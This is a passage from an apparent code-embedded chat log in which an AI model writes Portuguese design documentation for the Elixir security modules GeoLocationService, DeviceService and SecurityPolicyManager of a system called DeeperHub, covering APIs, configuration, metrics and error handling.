      {:ok, geo_data} -> IO.inspect(geo_data.city_name) # \"Mountain View\"
      {:error, reason} -> Logger.error(\"GeoIP lookup failed: #{reason}\")
    end
    ```

### 6.2. `DeeperHub.Security.GeoLocationService.assess_location_risk(ip_address :: String.t() | GeoData.t(), opts :: keyword()) :: {:ok, LocationRisk.t()} | {:error, reason :: atom()}`

*   **Descri√ß√£o:** Avalia o risco associado a um IP ou dados de geolocaliza√ß√£o j√° obtidos.
*   **`opts`:**
    *   `:user_context` (map): Informa√ß√µes sobre o usu√°rio para an√°lise comparativa (ex: `%{usual_countries: [\"BR\", \"US\"]}`).
*   **`LocationRisk.t()`:** `%{risk_score: float(), risk_level: atom(), factors: list(%{factor: atom(), description: String.t(), score_impact: float()})}`.
    *   Fatores: `:high_risk_country`, `:proxy_detected`, `:tor_node`, `:inconsistent_with_user_history`.
*   **Exemplo:**
    ```elixir
    GeoLocationService.assess_location_risk(\"1.2.3.4\", user_context: %{usual_countries: [\"BR\"]})
    # {:ok, %{risk_score: 75.0, risk_level: :high, factors: [...]}}
    ```

### 6.3. `DeeperHub.Security.GeoLocationService.is_impossible_travel?(prev_location :: StoredLocation.t(), current_ip :: String.t(), current_timestamp :: DateTime.t() | nil, opts :: keyword()) :: {:ok, ImpossibleTravelResult.t()} | {:error, reason :: atom()}`

*   **Descri√ß√£o:** Verifica se uma movimenta√ß√£o entre a `prev_location` (com seu timestamp) e a localiza√ß√£o do `current_ip` (no `current_timestamp`) √© geograficamente implaus√≠vel.
*   **`StoredLocation.t()`:** `%{latitude: float(), longitude: float(), timestamp: DateTime.t()}`.
*   **`opts`:**
    *   `:max_credible_speed_kmh` (integer): Velocidade m√°xima considerada cr√≠vel. (Padr√£o: config)
*   **`ImpossibleTravelResult.t()`:** `%{is_impossible: boolean(), calculated_speed_kmh: float() | nil, distance_km: float() | nil}`.
*   **Exemplo:**
    ```elixir
    last_loc = %{latitude: -23.55, longitude: -46.63, timestamp: DateTime.add(DateTime.utc_now(), -3600, :second)} # SP, 1 hora atr√°s
    GeoLocationService.is_impossible_travel?(last_loc, \"8.8.8.8\") # Mountain View, CA
    # {:ok, %{is_impossible: true, calculated_speed_kmh: 8000.0, ...}}
    ```

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :geo_location, :enabled]`** (Boolean): Habilita/desabilita o servi√ßo. (Padr√£o: `true`)
*   **`[:security, :geo_location, :default_provider_order]`** (List de Atoms): Ordem de prefer√™ncia dos adaptadores de provedor GeoIP (ex: `[:maxmind_api, :ipinfo_api, :local_db]`).
*   **`[:security, :geo_location, :providers, :maxmind_api, :api_key]`** (String): Chave de API para MaxMind.
*   **`[:security, :geo_location, :providers, :ipinfo_api, :api_key]`** (String): Chave de API para IPinfo.
*   **`[:security, :geo_location, :providers, :local_db, :path]`** (String): Caminho para a base de dados GeoIP local.
*   **`[:security, :geo_location, :cache, :ttl_seconds]`** (Integer): TTL para entradas de geolocaliza√ß√£o no cache. (Padr√£o: `86400` - 24 horas)
*   **`[:security, :geo_location, :risk, :high_risk_country_codes]`** (List de Strings): Lista de c√≥digos de pa√≠s ISO considerados de alto risco.
*   **`[:security, :geo_location, :risk, :known_proxy_ips_source]`** (String, opcional): URL ou caminho para uma lista de IPs de proxy conhecidos.
*   **`[:security, :geo_location, :risk, :impossible_travel_max_speed_kmh]`** (Integer): Velocidade m√°xima para detec√ß√£o de viagem imposs√≠vel. (Padr√£o: `800` km/h)

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Cache` (ou `Security.Cache.GeoCache`).
*   `DeeperHub.Core.CircuitBreakerFactory`: Para chamadas a APIs externas.
*   `DeeperHub.Core.HTTPClient`: Para realizar as chamadas HTTP aos provedores.
*   `DeeperHub.Security.Policy.SecurityPolicyManager`: Para obter listas de pa√≠ses de risco, etc.

### 8.2. Bibliotecas Externas

*   Bibliotecas cliente para provedores GeoIP (ex: se MaxMind fornecer um cliente Elixir).
*   `Jason` (ou similar) para parsear respostas JSON de APIs externas.
*   (Opcional) Bibliotecas para trabalhar com formatos de banco de dados GeoIP locais (ex: MaxMind DB Reader).

## ü§ù 9. Como Usar / Integra√ß√£o

O `GeoLocationService` √© primariamente consumido por outros m√≥dulos de seguran√ßa.

**Exemplo no `RiskAssessment`:**
```elixir
defp calculate_location_factors(ip_address, user_profile) do
  factors = 
    case DeeperHub.Security.GeoLocationService.get_location(ip_address) do
      {:ok, geo_data} ->
        location_risk_result = DeeperHub.Security.GeoLocationService.assess_location_risk(geo_data, user_context: user_profile.geo_history)
        
        travel_check = 
          if last_login = UserLoginHistory.get_last(user_profile.id) do
            DeeperHub.Security.GeoLocationService.is_impossible_travel?(last_login.location, ip_address)
          else
            {:ok, %{is_impossible: false}}
          end

        [
          %{factor: :country_risk, value: location_risk_result.risk_score},
          %{factor: :is_proxy, value: geo_data.is_proxy},
          %{factor: :impossible_travel, value: travel_check.is_impossible}
        ]
      {:error, _reason} ->
        [%{factor: :location_unknown, value: true}] # Penalidade se n√£o conseguir obter dados
    end
  factors
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada adaptador de provedor GeoIP com mocks para as APIs externas.
*   Testar a l√≥gica do `CompositeAdapter` para fallback entre provedores.
*   Testar a funcionalidade de cache (get, put, expira√ß√£o).
*   Testar as fun√ß√µes de `RiskAnalyzer` (`assess_location_risk`, `is_impossible_travel`) com diferentes cen√°rios.
*   Localiza√ß√£o: `test/deeper_hub/security/geo_location_service/`.

### 10.2. M√©tricas

*   `deeper_hub.security.geo_location.lookup.count` (tags: `provider`, `status` (`success`, `failure`, `cache_hit`, `cache_miss`))
*   `deeper_hub.security.geo_location.lookup.duration_ms` (Histograma, tags: `provider`)
*   `deeper_hub.security.geo_location.cache.size.gauge`
*   `deeper_hub.security.geo_location.risk_assessment.count` (tags: `risk_level_calculated`)
*   `deeper_hub.security.geo_location.impossible_travel.detected.count`

### 10.3. Logs

*   **N√≠vel DEBUG:** Detalhes da resposta de provedores GeoIP.
*   **N√≠vel INFO:** Lookup de IP bem-sucedido (especialmente se n√£o for do cache), detec√ß√£o de viagem imposs√≠vel.
*   **N√≠vel WARNING:** Falha ao contatar um provedor GeoIP prim√°rio, fallback para outro provedor ou base local. Lookup de IP de pa√≠s de alto risco.
*   **N√≠vel ERROR:** Falha ao contatar todos os provedores GeoIP configurados e nenhum fallback dispon√≠vel. Erros internos no servi√ßo.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :geo_location, :lookup, :start | :stop | :exception]`
    *   Metadados: `%{ip_address: ip, provider_used: provider, from_cache: boolean}`
    *   No `:stop`: `%{country_code: code, city: city}`
*   `[:deeper_hub, :security, :geo_location, :risk_analysis, :stop]`
    *   Metadados: `%{ip_address: ip, risk_score: score, risk_level: level}`
*   `[:deeper_hub, :security, :geo_location, :impossible_travel_check, :stop]`
    *   Metadados: `%{user_id: id, current_ip: ip, result: boolean, speed_kmh: speed}`

## ‚ùå 11. Tratamento de Erros

*   **Provedor Externo Indispon√≠vel:** O `CircuitBreaker` deve abrir para o provedor problem√°tico. O `CompositeAdapter` deve tentar o pr√≥ximo provedor na lista. Se todos falharem, pode-se usar uma base de dados local como fallback ou retornar um erro indicando que a geolocaliza√ß√£o n√£o p√¥de ser determinada.
*   **IP Inv√°lido:** A fun√ß√£o `get_location/1` deve validar o formato do IP e retornar um erro apropriado.
*   **Cache Indispon√≠vel:** Se o `GeoCache` falhar, o sistema deve tentar buscar diretamente dos provedores (com logging do erro do cache).

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Chaves de API:** As chaves de API para servi√ßos GeoIP externos devem ser armazenadas de forma segura (ex: vari√°veis de ambiente, `Core.ConfigManager` com `is_sensitive: true`) e n√£o expostas no c√≥digo.
*   **Precis√£o dos Dados:** A precis√£o dos dados de GeoIP varia. O sistema n√£o deve tomar decis√µes cr√≠ticas baseadas *apenas* em GeoIP sem corroborar com outros fatores, especialmente para IPs m√≥veis ou atr√°s de VPNs/proxies.
*   **Privacidade:** Embora endere√ßos IP sejam geralmente considerados dados menos sens√≠veis que PII direto, o armazenamento de hist√≥rico de localiza√ß√£o de IP deve seguir pol√≠ticas de reten√ß√£o e ser acessado apenas quando necess√°rio.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar um novo adaptador de provedor GeoIP, certifique-se de implementar o `GeoLocationAdapterBehaviour` e adicionar a l√≥gica de Circuit Breaker.
*   Mantenha as listas de pa√≠ses de alto risco e outros dados de refer√™ncia atualizados.
*   Documente a precis√£o esperada e as limita√ß√µes de cada provedor GeoIP usado.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um worker para atualizar automaticamente bases de dados GeoIP locais (ex: MaxMind GeoLite2).
*   [ ] Adicionar suporte para detec√ß√£o de VPNs e proxies de forma mais robusta, possivelmente integrando com servi√ßos especializados.
*   [ ] Permitir que os usu√°rios revisem e contestem informa√ß√µes de geolocaliza√ß√£o associadas √†s suas contas, se relevante.
*   [ ] Desenvolver heur√≠sticas mais avan√ßadas para `assess_location_risk` considerando a combina√ß√£o de ISP, ASN, tipo de IP (residencial, comercial, data center).
*   [ ] Cachear resultados de `is_impossible_travel` para pares de localiza√ß√µes/tempos frequentemente verificados, se a performance se tornar um gargalo.

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Agora que cobrimos a geolocaliza√ß√£o, faz sentido documentar o `DeeperHub.Security.DeviceService` (ou `SecurityManager` se ele englobar essa funcionalidade) que lida com o registro e confian√ßa de dispositivos, usando a `DeviceFingerprint`. Ou prefere mudar o foco?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos ent√£o detalhar o `DeeperHub.Security.DeviceService`. Este m√≥dulo √© crucial para o gerenciamento de dispositivos, trabalhando em conjunto com o `DeeperHub.Security.DeviceFingerprint` para identificar e gerenciar o acesso de diferentes dispositivos dos usu√°rios.

---

# M√≥dulo: `DeeperHub.Security.DeviceService` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.DeviceService`

O m√≥dulo `DeeperHub.Security.DeviceService` √© respons√°vel por gerenciar os dispositivos que os usu√°rios utilizam para acessar o sistema DeeperHub. Ele permite registrar novos dispositivos, associ√°-los a usu√°rios, marcar dispositivos como \"confi√°veis\", bloquear dispositivos suspeitos e manter um hist√≥rico de acesso por dispositivo.

Este servi√ßo utiliza as \"fingerprints\" geradas pelo `DeeperHub.Security.DeviceFingerprint` para identificar dispositivos de forma quasi-√∫nica. As informa√ß√µes gerenciadas por este servi√ßo s√£o um componente vital para a avalia√ß√£o de risco (`DeeperHub.Security.RiskAssessment`) e para a aplica√ß√£o de pol√≠ticas de autentica√ß√£o adaptativas (ex: pular MFA para dispositivos confi√°veis). üòä

*(Nota: Na documenta√ß√£o original, algumas dessas funcionalidades estavam dispersas ou impl√≠citas no `SecurityManager` ou `SecurityAdapter`. Esta documenta√ß√£o prop√µe um servi√ßo dedicado para maior clareza e coes√£o.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Registro de Dispositivos (`register_device/2`):**
    *   Registrar um novo dispositivo para um usu√°rio, associando-o a uma fingerprint de dispositivo.
    *   Armazenar metadados do dispositivo (ex: nome dado pelo usu√°rio, tipo, sistema operacional, navegador, data do primeiro uso).
*   **Gerenciamento de Confian√ßa de Dispositivos:**
    *   Permitir que um usu√°rio marque um dispositivo como \"confi√°vel\" (`trust_device/2`).
    *   Permitir que um usu√°rio remova o status de \"confi√°vel\" de um dispositivo (`untrust_device/2`).
    *   Verificar se um dispositivo (identificado por fingerprint ou ID) √© confi√°vel para um usu√°rio (`is_trusted_device?/2`).
    *   Suportar expira√ß√£o opcional para o status de confian√ßa.
*   **Bloqueio de Dispositivos (`block_device/3`):**
    *   Permitir que um usu√°rio ou administrador bloqueie um dispositivo espec√≠fico, impedindo seu acesso √† conta.
    *   Permitir o desbloqueio de dispositivos (`unblock_device/1`).
*   **Listagem de Dispositivos (`list_devices/1`):**
    *   Permitir que um usu√°rio visualize todos os dispositivos associados √† sua conta, com seus respectivos status (confi√°vel, bloqueado, √∫ltimo uso).
*   **Atualiza√ß√£o de Informa√ß√µes de Dispositivo:**
    *   Atualizar o timestamp do √∫ltimo uso e o √∫ltimo IP conhecido para um dispositivo (`update_last_used/3`).
*   **Consulta de Dispositivos:**
    *   Obter um dispositivo pelo seu ID (`get_device/1`).
    *   Obter um dispositivo pela sua fingerprint e ID do usu√°rio (`get_device_by_fingerprint/2`).
*   **Limpeza de Dispositivos Antigos/Inativos (Opcional):**
    *   Implementar uma l√≥gica para remover registros de dispositivos muito antigos ou inativos.
*   **Integra√ß√£o com Outros M√≥dulos de Seguran√ßa:**
    *   Fornecer informa√ß√µes sobre dispositivos para `RiskAssessment` e `FraudDetection`.
    *   Ser consultado por `DeeperHub.Auth` durante o fluxo de login para decis√µes sobre MFA.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.DeviceService` (Fachada/Servi√ßo Principal):**
    *   **Responsabilidade:** Ponto de entrada para todas as opera√ß√µes relacionadas a dispositivos. Cont√©m a l√≥gica de neg√≥cio.
    *   **Intera√ß√µes:**
        *   Utiliza `DeeperHub.Security.DeviceFingerprint.generate_fingerprint/1` ao registrar novos dispositivos.
        *   Interage com `DeeperHub.Core.Repo` para persistir e consultar dados de dispositivos no schema `DeviceSchema`.
        *   Pode interagir com `DeeperHub.Core.EventBus` para publicar eventos sobre mudan√ßas de status de dispositivos.
        *   Pode interagir com `DeeperHub.Core.Cache` para armazenar em cache informa√ß√µes de dispositivos frequentemente acessadas.
2.  **`DeeperHub.Security.Schema.DeviceSchema` (Ecto Schema, ex-`DeeperHub.Security.Device`):**
    *   **Responsabilidade:** Define a estrutura da tabela de dispositivos no banco de dados.
    *   **Campos:** `id`, `user_id`, `fingerprint` (hash), `name` (dado pelo usu√°rio), `type` (ex: \"desktop\", \"mobile\", \"tablet\"), `os`, `browser`, `first_seen_at`, `last_seen_at`, `last_known_ip`, `is_trusted`, `trusted_until` (opcional), `is_blocked`, `blocked_reason`, `blocked_at`.
3.  **`DeeperHub.Security.DeviceFingerprint` (M√≥dulo Colaborador):**
    *   Fornece a l√≥gica para gerar e comparar fingerprints.
4.  **Configura√ß√µes (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Dura√ß√£o padr√£o da confian√ßa de um dispositivo.
    *   N√∫mero m√°ximo de dispositivos confi√°veis por usu√°rio.
    *   Pol√≠ticas de limpeza de dispositivos inativos.

### 3.2. Estrutura de Diret√≥rios (Proposta)

Poderia estar dentro de `lib/deeper_hub/security/` ou, se mais complexo, em um subm√≥dulo `device_management`. Para este exemplo, vamos assumir que est√° em `security`.

```
lib/deeper_hub/security/
‚îú‚îÄ‚îÄ device_service.ex               # L√≥gica de neg√≥cio e fachada
‚îú‚îÄ‚îÄ device_fingerprint.ex           # (J√° documentado)
‚îÇ
‚îî‚îÄ‚îÄ schemas/                        # (Ou schema/)
    ‚îî‚îÄ‚îÄ device_schema.ex            # (Renomeado de Device para DeviceSchema para clareza)
```
Se houver um supervisor espec√≠fico para `DeviceService` (por exemplo, se ele usar um GenServer para alguma tarefa):
```
lib/deeper_hub/security/device_management/
‚îú‚îÄ‚îÄ device_service.ex
‚îú‚îÄ‚îÄ device_fingerprint.ex
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îî‚îÄ‚îÄ device_schema.ex
‚îî‚îÄ‚îÄ supervisor.ex
```
No entanto, muitas das fun√ß√µes do `DeviceService` s√£o opera√ß√µes CRUD que podem n√£o necessitar de um GenServer dedicado, dependendo diretamente do `Core.Repo`.

### 3.3. Decis√µes de Design Importantes

*   **Fingerprint como Identificador:** A fingerprint √© a chave para identificar um dispositivo, mas o `DeviceService` tamb√©m atribui um ID √∫nico de banco de dados a cada dispositivo registrado para facilitar o gerenciamento.
*   **Confian√ßa Gerenciada pelo Usu√°rio:** A decis√£o de confiar em um dispositivo deve ser primariamente do usu√°rio, mas o sistema pode oferecer recomenda√ß√µes ou aplicar pol√≠ticas.
*   **Associa√ß√£o com Usu√°rio:** Dispositivos s√£o sempre associados a um `user_id`. Uma mesma fingerprint em contas diferentes representa dispositivos diferentes para o sistema.
*   **Hist√≥rico vs. Estado Atual:** O `DeviceService` foca no estado atual e nos metadados dos dispositivos. O hist√≥rico detalhado de acesso por dispositivo (cada login) pode ser responsabilidade de um `LoginHistoryService` ou do `AuditLog`.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Usu√°rio Loga de um Novo Navegador:**
    *   Durante o login, uma nova fingerprint √© gerada.
    *   `DeviceService.get_device_by_fingerprint(user_id, new_fp)` n√£o encontra o dispositivo.
    *   `RiskAssessment` atribui um risco maior.
    *   Ap√≥s o login bem-sucedido, o sistema pergunta se o usu√°rio deseja \"Lembrar deste navegador\".
    *   Se sim, `DeviceService.register_device(user_id, new_fp, device_info_map, is_trusted: true)` √© chamado.
*   **Usu√°rio Gerencia Dispositivos Confi√°veis:**
    *   Usu√°rio acessa uma p√°gina de \"Meus Dispositivos\".
    *   `DeviceService.list_devices(user_id)` √© chamado para exibir a lista.
    *   Usu√°rio clica em \"N√£o confiar mais\" em um dispositivo.
    *   `DeviceService.untrust_device(user_id, device_id_to_untrust)` √© chamado.
*   **Administrador Bloqueia um Dispositivo Comprometido:**
    *   Ap√≥s uma investiga√ß√£o, um administrador identifica um dispositivo comprometido.
    *   `DeviceService.block_device(user_id, device_id_to_block, \"Suspeita de malware\")` √© chamado.
    *   Tentativas de login futuras usando a fingerprint desse dispositivo para esse usu√°rio ser√£o bloqueadas ou ter√£o risco muito elevado.

## üåä 5. Fluxos Importantes

### Fluxo de Registro de Novo Dispositivo Confi√°vel

1.  **Coleta no Cliente:** Frontend/App coleta `device_info`.
2.  **Gera√ß√£o de Fingerprint:** `fp = DeviceFingerprint.generate_fingerprint(device_info)`.
3.  **Chamada ao Servi√ßo:** Usu√°rio (ap√≥s login) opta por confiar. Frontend chama um endpoint que leva a `DeviceService.register_device(user_id, fp, device_info_map, %{is_trusted: true, name: \"Meu PC de Casa\"})`.
4.  **`DeviceService.register_device/4`:**
    *   Verifica se j√° existe um dispositivo com a mesma `fingerprint` para o `user_id`.
        *   Se sim, atualiza o `last_seen_at`, `is_trusted`, e o nome.
        *   Se n√£o, cria uma nova entrada `DeviceSchema` com os dados fornecidos.
    *   Persiste no banco de dados via `Core.Repo`.
    *   (Opcional) Publica um evento `device_registered` ou `device_trusted` no `Core.EventBus`.
    *   Retorna `{:ok, device_struct}`.

## üì° 6. API (Fun√ß√µes P√∫blicas do M√≥dulo)

### 6.1. `DeeperHub.Security.DeviceService.register_device(user_id :: String.t(), fingerprint :: String.t(), device_attributes :: map(), opts :: keyword()) :: {:ok, DeviceSchema.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descri√ß√£o:** Registra um novo dispositivo para um usu√°rio ou atualiza um existente com a mesma fingerprint.
*   **`device_attributes`:** Mapa com dados como `%{name: \"Meu Laptop\", type: \"desktop\", os: \"Windows 10\", browser: \"Chrome\", first_seen_ip: \"...\"}`.
*   **`opts`:**
    *   `:is_trusted` (boolean): Se o dispositivo deve ser marcado como confi√°vel. (Padr√£o: `false`)
    *   `:trust_duration_seconds` (integer | nil): Dura√ß√£o da confian√ßa. `nil` para indefinido.
*   **Retorno:** A struct do dispositivo criado/atualizado ou um erro.

### 6.2. `DeeperHub.Security.DeviceService.list_devices(user_id :: String.t(), opts :: keyword()) :: {:ok, list(DeviceSchema.t())} | {:error, term()}`

*   **Descri√ß√£o:** Lista os dispositivos registrados para um usu√°rio.
*   **`opts`:**
    *   `:filter_status` (atom | nil): `:trusted`, `:blocked`, `:untrusted`.
    *   `:sort_by` (atom): Campo para ordena√ß√£o (ex: `:last_seen_at`). (Padr√£o: `:last_seen_at`)
    *   `:sort_order` (atom): `:asc` ou `:desc`. (Padr√£o: `:desc`)

### 6.3. `DeeperHub.Security.DeviceService.get_device(device_id :: String.t()) :: {:ok, DeviceSchema.t()} | {:error, :not_found}`

*   **Descri√ß√£o:** Obt√©m um dispositivo pelo seu ID √∫nico de banco de dados.

### 6.4. `DeeperHub.Security.DeviceService.get_device_by_fingerprint(user_id :: String.t(), fingerprint :: String.t()) :: {:ok, DeviceSchema.t()} | {:error, :not_found}`

*   **Descri√ß√£o:** Obt√©m um dispositivo pela fingerprint e ID do usu√°rio.

### 6.5. `DeeperHub.Security.DeviceService.trust_device(user_id :: String.t(), device_id_or_fp :: String.t(), opts :: keyword()) :: {:ok, DeviceSchema.t()} | {:error, term()}`

*   **Descri√ß√£o:** Marca um dispositivo como confi√°vel. `device_id_or_fp` pode ser o ID do dispositivo ou sua fingerprint.
*   **`opts`:**
    *   `:duration_seconds` (integer | nil): Por quanto tempo o dispositivo ser√° confi√°vel.

### 6.6. `DeeperHub.Security.DeviceService.untrust_device(user_id :: String.t(), device_id_or_fp :: String.t()) :: {:ok, DeviceSchema.t()} | {:error, term()}`

*   **Descri√ß√£o:** Remove o status de confi√°vel de um dispositivo.

### 6.7. `DeeperHub.Security.DeviceService.block_device(user_id :: String.t(), device_id_or_fp :: String.t(), reason :: String.t()) :: {:ok, DeviceSchema.t()} | {:error, term()}`

*   **Descri√ß√£o:** Bloqueia um dispositivo.

### 6.8. `DeeperHub.Security.DeviceService.unblock_device(user_id :: String.t(), device_id_or_fp :: String.t()) :: {:ok, DeviceSchema.t()} | {:error, term()}`

*   **Descri√ß√£o:** Desbloqueia um dispositivo.

### 6.9. `DeeperHub.Security.DeviceService.is_trusted_device?(user_id :: String.t(), fingerprint :: String.t()) :: boolean()`

*   **Descri√ß√£o:** Verifica rapidamente se a fingerprint corresponde a um dispositivo confi√°vel para o usu√°rio.

### 6.10. `DeeperHub.Security.DeviceService.update_last_used(user_id :: String.t(), fingerprint :: String.t(), ip_address :: String.t()) :: {:ok, DeviceSchema.t()} | {:error, term()}`

*   **Descri√ß√£o:** Atualiza o timestamp de √∫ltimo uso e o √∫ltimo IP conhecido para um dispositivo identificado pela fingerprint. Registra o dispositivo se ele for novo.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :device_service, :default_trust_duration_days]`** (Integer): Dura√ß√£o padr√£o em dias para um dispositivo ser considerado confi√°vel se nenhuma dura√ß√£o espec√≠fica for fornecida. (Padr√£o: `30`)
*   **`[:security, :device_service, :max_trusted_devices_per_user]`** (Integer): N√∫mero m√°ximo de dispositivos que um usu√°rio pode marcar como confi√°veis. (Padr√£o: `5`)
*   **`[:security, :device_service, :auto_untrust_inactive_days]`** (Integer | nil): N√∫mero de dias de inatividade ap√≥s os quais um dispositivo confi√°vel perde automaticamente sua confian√ßa. `nil` para desabilitar. (Padr√£o: `90`)
*   **`[:security, :device_service, :cleanup_inactive_devices_days]`** (Integer | nil): N√∫mero de dias de inatividade ap√≥s os quais um dispositivo n√£o confi√°vel e n√£o bloqueado √© removido. `nil` para desabilitar. (Padr√£o: `365`)

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Repo`, `Core.EventBus`.
*   `DeeperHub.Security.DeviceFingerprint`: Para gerar fingerprints.
*   `DeeperHub.Security.Policy.SecurityPolicyManager`: Para obter pol√≠ticas relacionadas a dispositivos.
*   `DeeperHub.Audit`: Para registrar a√ß√µes de gerenciamento de dispositivos.

### 8.2. Bibliotecas Externas

*   `Ecto`: Para persist√™ncia.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Fluxo de Login (`DeeperHub.Auth`):**
    *   Ap√≥s o login, obter a fingerprint do dispositivo atual.
    *   Chamar `DeviceService.update_last_used/3` para registrar a atividade do dispositivo.
    *   Verificar `DeviceService.is_trusted_device?/2`. Se n√£o for confi√°vel, e o risco for baixo, apresentar ao usu√°rio a op√ß√£o de confiar no dispositivo.
*   **Configura√ß√µes de Seguran√ßa do Usu√°rio (UI):**
    *   Chamar `DeviceService.list_devices/1` para exibir os dispositivos.
    *   Permitir que o usu√°rio chame `trust_device`, `untrust_device`, `block_device` (para seus pr√≥prios dispositivos).

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o registro de novos dispositivos.
*   Testar a l√≥gica de confiar/n√£o confiar/bloquear/desbloquear.
*   Testar a atualiza√ß√£o de `last_seen_at` e `last_known_ip`.
*   Testar a listagem de dispositivos com diferentes filtros.
*   Testar a consulta por fingerprint.
*   Localiza√ß√£o: `test/deeper_hub/security/device_service/` (ou `device_management`).

### 10.2. M√©tricas

*   `deeper_hub.security.device.registered.count`
*   `deeper_hub.security.device.trusted.count`
*   `deeper_hub.security.device.untrusted.count`
*   `deeper_hub.security.device.blocked.count`
*   `deeper_hub.security.device.active_trusted.gauge` (Gauge, por usu√°rio ou global)
*   `deeper_hub.security.device.login_from_new_device.count` (Contador)

### 10.3. Logs

*   **N√≠vel INFO:** Novo dispositivo registrado, dispositivo marcado como confi√°vel/n√£o confi√°vel/bloqueado.
*   **N√≠vel WARNING:** Tentativa de registrar um dispositivo al√©m do limite permitido para um usu√°rio.
*   **N√≠vel ERROR:** Falha ao persistir dados do dispositivo.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :device, :registered]`
    *   Metadados: `%{user_id: id, device_id: id, fingerprint: fp, initial_status: status}`
*   `[:deeper_hub, :security, :device, :status_changed]`
    *   Metadados: `%{user_id: id, device_id: id, fingerprint: fp, old_status: atom(), new_status: atom(), reason: reason}`
*   `[:deeper_hub, :security, :device, :accessed]`
    *   Metadados: `%{user_id: id, device_id: id, fingerprint: fp, ip_address: ip, is_trusted: boolean}`

## ‚ùå 11. Tratamento de Erros

*   Falhas ao registrar um dispositivo n√£o devem impedir um login, mas devem ser logadas. O `RiskAssessment` pode tratar um dispositivo \"n√£o registr√°vel\" como de maior risco.
*   Conflitos (ex: duas requisi√ß√µes tentando registrar a mesma fingerprint para o mesmo usu√°rio ao mesmo tempo) devem ser tratados pela camada de persist√™ncia (constraints de banco de dados).

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Autentica√ß√£o para Gerenciamento:** A√ß√µes como `trust_device`, `untrust_device`, `block_device` devem ser protegidas e s√≥ podem ser realizadas pelo propriet√°rio da conta ou por um administrador com as devidas permiss√µes.
*   **Fingerprint n√£o √© Infal√≠vel:** A fingerprint √© um identificador forte, mas n√£o absoluto. N√£o deve ser o √∫nico fator para decis√µes de seguran√ßa cr√≠ticas.
*   **Limpeza de Dados:** Definir pol√≠ticas claras para reten√ß√£o de dados de dispositivos inativos para cumprir com regulamenta√ß√µes de privacidade.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Garantir que as intera√ß√µes com o `DeviceFingerprint` sejam consistentes.
*   Manter a separa√ß√£o de responsabilidades: `DeviceFingerprint` gera/compara, `DeviceService` gerencia a entidade e seu estado.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um worker para desconfiar automaticamente dispositivos inativos por um longo per√≠odo.
*   [ ] Permitir que os usu√°rios nomeiem seus dispositivos registrados para facilitar a identifica√ß√£o. (J√° incluso no schema, garantir UI).
*   [ ] Adicionar mais atributos ao `DeviceSchema` coletados de `device_info` para melhor an√°lise e diferencia√ß√£o (ex: modelo do dispositivo, vers√£o do SO detalhada).
*   [ ] Notificar o usu√°rio quando um novo dispositivo √© registrado em sua conta.
*   [ ] Implementar limites no n√∫mero de dispositivos que um usu√°rio pode ter registrados ou marcados como confi√°veis. (J√° previsto na config).

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Agora que cobrimos o gerenciamento de dispositivos, o `DeeperHub.Security.GeoLocationService` (que j√° documentamos parcialmente) seria o pr√≥ximo passo natural para completar a contextualiza√ß√£o de uma requisi√ß√£o/sess√£o. Depois dele, poder√≠amos ir para o `DeeperHub.Security.Policy.SecurityPolicyManager`. O que acha?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! J√° detalhamos o `DeeperHub.Security.GeoLocationService`. Ent√£o, vamos prosseguir para o `DeeperHub.Security.Policy.SecurityPolicyManager`. Este m√≥dulo √© fundamental para a configurabilidade e adaptabilidade de toda a camada de seguran√ßa.

---

# M√≥dulo: `DeeperHub.Security.Policy.SecurityPolicyManager` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.Policy.SecurityPolicyManager`

O m√≥dulo `DeeperHub.Security.Policy.SecurityPolicyManager` atua como o **gerenciador centralizado para todas as pol√≠ticas de seguran√ßa** dentro do sistema DeeperHub. Ele fornece uma interface unificada para definir, consultar e atualizar diversas pol√≠ticas que governam o comportamento dos diferentes subm√≥dulos de seguran√ßa (ex: `RiskAssessment`, `BruteForceProtection`, `MFA`, `SessionPolicy`, etc.).

